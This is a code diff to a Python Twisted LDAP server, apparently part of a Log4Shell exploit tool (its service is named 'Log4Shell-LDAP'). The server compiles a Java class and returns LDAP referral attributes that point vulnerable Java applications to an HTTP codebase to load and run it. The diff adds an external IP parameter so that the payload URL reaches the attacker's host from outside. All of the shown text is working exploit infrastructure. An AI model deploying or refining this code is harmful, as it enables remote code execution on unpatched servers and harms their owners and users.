@@ -21,8 +21,9 @@ import os
 
 class CustomLDAPServer(LDAPServer):
 
-    def __init__(self,local_ip=None,port=None):
+    def __init__(self,local_ip=None,external_ip=None,port=None):
         self.local_ip = local_ip
+        self.external_ip = external_ip
         self.port = port
         LDAPServer.__init__(self)
 
@@ -43,7 +44,7 @@ class CustomLDAPServer(LDAPServer):
         # os.system(f"/usr/lib/jvm/java-8-openjdk-amd64/bin/javac {TMPCODE} > /dev/null 2>&1")
         os.system(f"javac {TMPCODE} > /dev/null 2>&1")
         
-        rr = f"http://{self.local_ip}:{self.port}/"
+        rr = f"http://{self.external_ip}:{self.port}/"
         f = f"{rr}{class_name}"
         attr = [
                     ("javaClassName", ["Main"]),
@@ -66,26 +67,27 @@ class CustomLDAPServer(LDAPServer):
 class LDAPServerFactory(ServerFactory):
     protocol = CustomLDAPServer
 
-    def __init__(self, root=None,local_ip=None,port=None):
+    def __init__(self, root=None,local_ip=None,external_ip=None,port=None):
         self.root = None
         super(ServerFactory).__init__()
         self.local_ip = local_ip
+        self.external_ip = external_ip
         self.http_port = port
 
 
 
     def buildProtocol(self, addr):
-        proto = self.protocol(local_ip=self.local_ip,port=self.http_port)        
+        proto = self.protocol(local_ip=self.local_ip,external_ip=self.external_ip,port=self.http_port)
         proto.debug = self.debug
         proto.factory = self
         return proto
 
 
-def START_LDAP_SERVER(IP,PORT,httpport):
+def START_LDAP_SERVER(LIP,EIP,PORT,httpport):
     from twisted.internet import reactor
     port = PORT
     registerAdapter(lambda x: x.root, LDAPServerFactory, IConnectedLDAPEntry)
-    factory = LDAPServerFactory(local_ip=IP,port=httpport)
+    factory = LDAPServerFactory(local_ip=LIP,external_ip=EIP,port=httpport)
     factory.debug = True
     application = service.Application("Log4Shell-LDAP")
     myService = service.IServiceCollection(application)
